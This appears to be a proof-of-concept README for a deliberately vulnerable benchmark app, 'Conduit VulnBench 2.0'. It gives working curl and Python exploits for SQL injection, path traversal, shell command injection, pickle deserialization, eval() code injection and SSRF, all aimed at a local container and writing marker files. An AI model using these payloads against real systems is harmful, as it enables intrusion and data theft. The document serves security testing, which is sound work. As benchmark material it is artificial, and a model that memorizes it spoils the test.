# Conduit VulnBench 2.0 proof of concepts

Run these commands only against a local instance of this fixture. The payloads
were verified against this fixture on 2026-08-18. They are destructive only
within the local container and write marker files below `/tmp`.

## Start the local stack and create test data

Run from `fixtures/app-project-conduit/project`:

```sh
docker compose up -d --build
docker compose exec app python -c "
from conduit.app import create_app
from conduit.settings import DevConfig
from conduit.database import db
app = create_app(DevConfig)
with app.app_context():
    db.create_all()
"

TOKEN=$(curl -sS -X POST http://localhost:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{"user":{"username":"poc-user","email":"poc@example.test","password":"poc-password"}}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['user']['token'])")

curl -sS -X POST http://localhost:5000/api/articles \
  -H "Content-Type: application/json" \
  -H "Authorization: Token $TOKEN" \
  -d '{"article":{"title":"How to train your dragon","description":"Fixture article","body":"You have to believe in yourself","tagList":["dragons"]}}'

SLUG=how-to-train-your-dragon
```

## SQL injection — article search

The keyword search concatenates the `q` parameter directly into a raw SQL `LIKE` clause. A
non-matching term returns nothing; the same term with an inline SQL comment bypasses the filter
entirely and returns every article:

```sh
# control — matches nothing
curl -sS --data-urlencode "q=x" -G "http://localhost:5000/api/articles/search"

# injection — always-true, returns every article regardless of the term
curl -sS --data-urlencode "q=x' OR '1'='1' -- " -G "http://localhost:5000/api/articles/search"
```

## Path traversal — article download

The download endpoint joins a request-controlled `filename` onto the article's export directory
with no containment check:

```sh
curl -sS --data-urlencode "filename=../../../../../../etc/hosts" \
  -G "http://localhost:5000/api/articles/$SLUG/download"
```

## Command injection — PDF export label

The PDF export endpoint builds a shell command by string-formatting the `label` parameter
(or the article title) directly into it with `shell=True`. A quote-breaking label runs an
arbitrary command:

```sh
curl -sS --data-urlencode 'label=x"; id > /tmp/pwned 2>&1; echo "' \
  -G "http://localhost:5000/api/articles/$SLUG/pdf"
docker compose exec app cat /tmp/pwned
```

## Insecure deserialization — resume article draft

The draft-resume endpoint unpickles the base64-decoded `draft` query parameter with no
authentication and no integrity check:

```sh
PAYLOAD=$(python3 -c "
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned 2>&1',))
print(base64.urlsafe_b64encode(pickle.dumps(Exploit())).decode())
")
curl -sS --data-urlencode "draft=$PAYLOAD" -G "http://localhost:5000/api/articles/draft/resume"
docker compose exec app cat /tmp/pwned
```

## Code injection — advanced article filter

The filter endpoint evaluates the `expression` parameter with `eval()`, passing only a
local-variable context dict — which does not restrict access to builtins:

```sh
curl -sS --data-urlencode \
  'expression=__import__("os").system("id > /tmp/pwned 2>&1") == 0' \
  -G "http://localhost:5000/api/articles/filter"
docker compose exec app cat /tmp/pwned
```

## SSRF — avatar URL verification

Updating a profile's `image` triggers a server-side fetch to confirm the URL is really an
image, with no allowlist on the target host:

```sh
# Start a marker server on the host first:
mkdir -p /tmp/conduit-ssrf-marker && printf 'fixture image' > /tmp/conduit-ssrf-marker/avatar.png
python3 -m http.server 9001 --directory /tmp/conduit-ssrf-marker &

curl -sS -X PUT "http://localhost:5000/api/user" -H "Content-Type: application/json" \
  -H "Authorization: Token $TOKEN" \
  -d '{"user":{"image":"http://host.docker.internal:9001/avatar.png"}}'
# the marker server's own access log shows the hit — proving the server made the request
```

`host.docker.internal` is available in Docker Desktop. On Linux, use the Docker
bridge gateway address (commonly `172.17.0.1`) or add an equivalent host-gateway
mapping before starting the application container.

## Clean up

```sh
docker compose down -v
rm -f dev.db
rm -rf exports /tmp/conduit-ssrf-marker
```
